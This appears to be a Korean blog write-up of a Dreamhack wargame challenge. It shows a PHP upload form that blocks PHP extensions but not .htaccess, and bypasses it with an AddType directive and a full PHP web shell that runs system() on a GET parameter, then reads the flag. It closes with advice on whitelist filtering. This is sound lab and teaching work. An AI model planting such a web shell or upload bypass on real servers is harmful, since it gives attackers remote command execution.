---
title: (13) Dreamhack Apache htaccess 문제 풀이
date: 2024-01-16 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
파일 업로드 기능을 악용하여 서버의 권한을 획득하세요 !  
  
## .htaccess
htaccess는 hypertext access의 약자로, 이 파일이 있는 디렉토리는 서버 메인 설정과 별개로 해당 디렉토리와 그 하위 디렉토리에 대한 설정을 변경할 수 있습니다.  
다양한 설정들이 있으나, 이번에 사용해볼 것은 AddType이라는 지시어 입니다.  
  
AddType 지시어는 특정 확장자를 다른 확장자로 간주하도록 할 수 있는 기능입니다.  
예를 들어,
```
AddType application/x-httpd-php .txt
```
다음과 같이 입력하면, 이 .htaccess파일이 존재하는 디렉토리 및 그 하위 디렉토리에서는 .txt파일이 php와 같이 동작하게 됩니다.

## 문제 풀이
![](http://localhost:4000/assets/img/post/13/1.png)
사이트에는 이런 형태의 파일 업로드 기능이 구현되어 있습니다.
```php
<?php
$deniedExts = array("php", "php3", "php4", "php5", "pht", "phtml");

if (isset($_FILES)) {
    $file = $_FILES["file"];
    $error = $file["error"];
    $name = $file["name"];
    $tmp_name = $file["tmp_name"];
   
    if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
    }else {
        $temp = explode(".", $name);
        $extension = end($temp);
       
        if(in_array($extension, $deniedExts)){
            die($extension . " extension file is not allowed to upload ! ");
        }else{
            move_uploaded_file($tmp_name, "upload/" . $name);
            echo "Stored in: <a href='/upload/{$name}'>/upload/{$name}</a>";
        }
    }
}else {
    echo "File is not selected";
}
?>
```
업로드 기능은 위와 같이 구현되어 있는데, php 관련 확장자들은 필터링해서 업로드를 막고 있습니다.  
※참고로 php 버전이 5.x버전이라 php7 확장자는 사용할 수 없었습니다.  
  
하지만 앞서 살펴본 .htaccess 파일에 대한 필터링은 없네요.
그래서 저는 아래 두 파일을 업로드 시켰습니다.  
  
.htaccess
```
AddType application/x-httpd-php .txt
```
  
shell.txt
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```
~~제가 맨날 사용하는 그 쉘입니다.~~ 두 파일 모두 업로드를 마친 후에 `/upload/shell.txt`로 들어가 보면 정상적으로 php파일 화면이 나옵니다. 이제 flag만 찾으면 됩니다.

flag는 /flag에 있습니다.
`/flag`를 입력하고 실행해주면
![](http://localhost:4000/assets/img/post/13/2.png)
flag를 얻었습니다.  
  
확장자를 예측할 수 없는 파일 업로드에는 이런 설정파일도 필터링해야 합니다.  
또한 이 문제같은 블랙리스트 기반 필터링 보다는 화이트리스트 기반 필터링이 안전하고요.  
업로드 했다고 해도 저렇게 경로를 알기 쉽게 하거나, 안전한 형태로 저장하지 않는 것은 위험합니다.
{% endraw %}